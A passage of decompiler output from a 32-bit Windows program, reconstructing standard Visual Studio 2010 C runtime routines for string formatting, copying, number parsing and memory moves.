  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar3;
  }
  if (-1 < iVar3) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar2 = __flsbuf(0,&local_24);
      if (iVar2 == -1) goto LAB_0040b315;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar3;
    }
    iVar2 = __flsbuf(0,&local_24);
    if (iVar2 != -1) {
      return iVar3;
    }
  }
LAB_0040b315:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return -1;
  }
  if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vswprintf_helper(__woutput_s_l,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList)
    ;
    if (iVar2 < 0) {
      *_DstBuf = L'\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_0040c664();
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



undefined4 * __thiscall FUN_0040b3cb(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0041a260;
  FUN_004102b1((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a83e(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040b3f2(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_0041a260;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2010 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0042186c & 1) == 0) {
    _DAT_0042186c = _DAT_0042186c | 1;
    local_8 = s_bad_allocation_0041a268;
    std::exception::exception((exception *)&DAT_00421860,&local_8,1);
    _DAT_00421860 = &PTR_FUN_0041a260;
    _atexit((_func_4879 *)&LAB_00419e41);
  }
  std::exception::exception((exception *)local_14,(exception *)&DAT_00421860);
  local_14[0] = &PTR_FUN_0041a260;
  __CxxThrowException_8(local_14,&DAT_0041e92c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2019 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  short sVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if (_Count != 0) {
    puVar4 = (undefined4 *)_Dest;
    do {
      sVar1 = *(short *)(((int)_Source - (int)_Dest) + (int)puVar4);
      *(short *)puVar4 = sVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      if (sVar1 == 0) break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2010 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00420d10) && ((p_Var2->_ownlocale & DAT_00420ac8) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_004209d0) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00420ac8) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2010 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  _LocaleUpdate local_34 [8];
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate(local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_0040c664();
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_0040b806;
  }
  _C = *param_2;
  local_c = 0;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = _iswctype(_C,8);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_0040b5f5:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_0040b5f5;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_0040b806:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_0040b670;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_0040b670;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_0040b670:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_0040b806;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_00422244 == 0) {
    ppuVar2 = &PTR_DAT_00420d14;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        cVar1 = *_Src;
        _Src[iVar3] = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040b853;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040b853:
  FUN_0040c664();
  return eStack_10;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    iVar3 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar3) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar3;
        }
        iVar2 = __flsbuf(0,&local_24);
        if (iVar2 != -1) {
          return iVar3;
        }
      }
      param_2[param_3 - 1] = '\0';
      iVar3 = (-1 < local_24._cnt) - 2;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  __vsprintf_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsprintf_s_l(char *_DstBuf,size_t _DstSize,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_0040c664();
    return -1;
  }
  if ((_DstBuf == (char *)0x0) || (_DstSize == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
  }
  else {
    iVar2 = __vsnprintf_helper(__output_s_l,_DstBuf,_DstSize,(int)_Format,_Locale,_ArgList);
    if (iVar2 < 0) {
      *_DstBuf = '\0';
    }
    if (iVar2 != -2) {
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x22;
  }
  FUN_0040c664();
  return -1;
}



// Library Function - Single Match
//  _vsprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _vsprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2010 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return 0;
}



// Library Function - Single Match
//  _wcsncpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  int iVar4;
  rsize_t rVar5;
  errno_t eStack_14;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_0040ba70:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          rVar5 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            iVar4 = (int)_Dst - (int)_Src;
            do {
              wVar1 = *_Src;
              *(wchar_t *)(iVar4 + (int)_Src) = wVar1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar5 = rVar5 - 1;
            } while (rVar5 != 0);
          }
          else {
            pwVar3 = _Dst;
            do {
              wVar1 = *(wchar_t *)(((int)_Src - (int)_Dst) + (int)pwVar3);
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              if ((wVar1 == L'\0') || (rVar5 = rVar5 - 1, rVar5 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar5 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          eStack_14 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0040ba81;
        }
        *_Dst = L'\0';
      }
    }
  }
  else if (_Dst != (wchar_t *)0x0) goto LAB_0040ba70;
  piVar2 = __errno();
  eStack_14 = 0x16;
  *piVar2 = 0x16;
LAB_0040ba81:
  FUN_0040c664();
  return eStack_14;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  errno_t eStack_10;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        iVar4 = (int)pcVar3 - (int)_Src;
        do {
          cVar1 = *_Src;
          _Src[iVar4] = cVar1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eStack_10 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040bb8a;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040bb8a:
  FUN_0040c664();
  return eStack_10;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2010 Release

int __thiscall _xtow_s_20(void *this,uint param_1,uint param_2,int param_3)

{
  short *psVar1;
  uint in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  uint uVar6;
  int iStack_14;
  
  if (this == (void *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_0040c664();
    return 0x16;
  }
  if (param_1 == 0) {
LAB_0040bc03:
    piVar2 = __errno();
    iStack_14 = 0x16;
  }
  else {
    *(undefined2 *)this = 0;
    if ((param_3 != 0) + 1 < param_1) {
      if (param_2 - 2 < 0x23) {
        psVar3 = (short *)this;
        if (param_3 != 0) {
          *(undefined2 *)this = 0x2d;
          psVar3 = (short *)((int)this + 2);
          in_EAX = -in_EAX;
        }
        uVar6 = (uint)(param_3 != 0);
        psVar1 = psVar3;
        do {
          psVar4 = psVar1;
          sVar5 = (short)(in_EAX % param_2);
          if (in_EAX % param_2 < 10) {
            sVar5 = sVar5 + 0x30;
          }
          else {
            sVar5 = sVar5 + 0x57;
          }
          *psVar4 = sVar5;
          uVar6 = uVar6 + 1;
        } while ((in_EAX / param_2 != 0) &&
                (in_EAX = in_EAX / param_2, psVar1 = psVar4 + 1, uVar6 < param_1));
        if (uVar6 < param_1) {
          psVar4[1] = 0;
          do {
            sVar5 = *psVar4;
            *psVar4 = *psVar3;
            *psVar3 = sVar5;
            psVar4 = psVar4 + -1;
            psVar3 = psVar3 + 1;
          } while (psVar3 < psVar4);
          return 0;
        }
        *(undefined2 *)this = 0;
        piVar2 = __errno();
        iStack_14 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040bc0d;
      }
      goto LAB_0040bc03;
    }
    piVar2 = __errno();
    iStack_14 = 0x22;
  }
  *piVar2 = iStack_14;
LAB_0040bc0d:
  FUN_0040c664();
  return iStack_14;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_DstBuf,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_0040bcee:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_0040bcf8:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        FID_conflict__memcpy(_Dst,_Src,_MaxCount);
        goto LAB_0040bcee;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_0040bcf8;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    FUN_0040c664();
  }
  return eVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040bf3f_caseD_2;
        case 3:
          goto switchD_0040bf3f_caseD_3;
        }
        goto switchD_0040bf3f_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040bf3f_caseD_0;
      case 1:
        goto switchD_0040bf3f_caseD_1;
      case 2:
        goto switchD_0040bf3f_caseD_2;
      case 3:
        goto switchD_0040bf3f_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar2 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040bf3f_caseD_2;
            case 3:
              goto switchD_0040bf3f_caseD_3;
            }
            goto switchD_0040bf3f_caseD_1;
          }
          break;
        case 2:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040bf3f_caseD_2;
            case 3:
              goto switchD_0040bf3f_caseD_3;
            }
            goto switchD_0040bf3f_caseD_1;
          }
          break;
        case 3:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar2 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar2) {
            for (; uVar2 != 0; uVar2 = uVar2 - 1) {
              *puVar4 = *puVar1;
              puVar1 = puVar1 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar3) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040bf3f_caseD_2;
            case 3:
              goto switchD_0040bf3f_caseD_3;
            }
            goto switchD_0040bf3f_caseD_1;
          }
        }
      }
    }
    switch(uVar2) {
    case 7:
      puVar4[7 - uVar2] = puVar1[7 - uVar2];
    case 6:
      puVar4[6 - uVar2] = puVar1[6 - uVar2];
    case 5:
      puVar4[5 - uVar2] = puVar1[5 - uVar2];
    case 4:
      puVar4[4 - uVar2] = puVar1[4 - uVar2];
    case 3:
      puVar4[3 - uVar2] = puVar1[3 - uVar2];
    case 2:
      puVar4[2 - uVar2] = puVar1[2 - uVar2];
    case 1:
      puVar4[1 - uVar2] = puVar1[1 - uVar2];
      puVar1 = puVar1 + -uVar2;
      puVar4 = puVar4 + -uVar2;
    }
    switch(uVar3) {
    case 1:
switchD_0040bf3f_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      return _Dst;
    case 2:
switchD_0040bf3f_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
      return _Dst;
    case 3:
switchD_0040bf3f_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
